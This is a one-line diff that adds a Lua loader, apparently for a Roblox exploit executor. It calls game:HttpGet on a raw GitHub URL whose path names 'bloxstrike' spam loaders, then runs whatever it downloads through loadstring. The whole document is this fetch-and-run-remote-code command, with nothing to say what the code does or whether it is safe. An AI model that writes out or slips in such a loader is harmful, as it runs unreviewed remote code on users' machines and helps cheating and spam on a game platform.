@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AssemblyLook/loaders/main/loaders/new-map-bloxstrike-spam3-bzkcbkt8dzlpp6.lua"))()
